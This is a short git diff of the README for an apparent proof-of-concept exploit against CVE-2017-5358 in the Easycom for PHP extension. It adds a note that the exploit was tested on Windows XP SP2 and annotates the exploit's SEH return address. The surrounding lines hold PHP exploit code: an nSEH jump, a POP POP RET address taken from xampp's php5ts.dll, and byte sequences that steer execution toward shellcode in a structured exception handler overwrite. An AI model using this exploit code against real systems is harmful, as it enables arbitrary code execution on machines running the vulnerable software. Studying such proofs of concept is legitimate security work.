@@ -13,6 +13,8 @@ CVE: CVE-2017-5358
 
 The vulnerable code is into `php_Easycom5_3_0.dll`.
 
+Tested on Windows XP SP2.
+
 ## Requirements
 * EasycomPHP_4.0029.iC8im2.exe
 * PHP 5.3.1 (cli) (built: Nov 20 2009 17:26:32)
@@ -23,7 +25,7 @@ The vulnerable code is into `php_Easycom5_3_0.dll`.
 <?php
 
 $nseh = "\xeb\x06\x90\x90";		# JMP ESP+6
-$seh = "\x81\x04\x02\x10";		# POP POP RET
+$seh = "\x81\x04\x02\x10";		# POP POP RET - xampp\php\php5ts.dll
 
 $jump_to_sc = "\x59\x59\x59";		# POP ECX ; POP ECX ; POP ECX
 $jump_to_sc = $jump_to_sc . "\xfe\xcd"; # DEC CH
